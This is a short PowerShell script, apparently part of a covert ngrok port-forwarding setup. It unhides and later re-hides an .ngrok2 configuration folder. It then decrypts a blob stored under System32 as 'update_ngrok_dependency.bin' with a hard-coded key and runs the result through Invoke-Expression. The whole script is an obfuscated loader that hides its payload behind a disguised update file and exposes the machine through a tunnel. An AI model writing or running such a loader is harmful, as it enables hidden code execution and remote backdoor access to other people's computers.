#we need to unhide our file before we could alter it and then we will hide it back in our ngrok_dependency script
attrib -S /s /d -H "$env:HOMEDRIVE$env:HOMEPATH\.ngrok2\*"
attrib -S /s /d -H "$env:HOMEDRIVE$env:HOMEPATH\.ngrok2"

#runs our ngrok_dependency.bin file to forward our ports
$path1 = "$env:SystemRoot\System32\mydir\update_ngrok_dependency.bin"
$raw = Get-Content $path1
[Byte[]] $key = (1..32)
$secure = ConvertTo-SecureString $raw -key $key
$helper = New-Object system.Management.Automation.PSCredential("test", $secure)
$plain = $helper.GetNetworkCredential().Password
Invoke-Expression $plain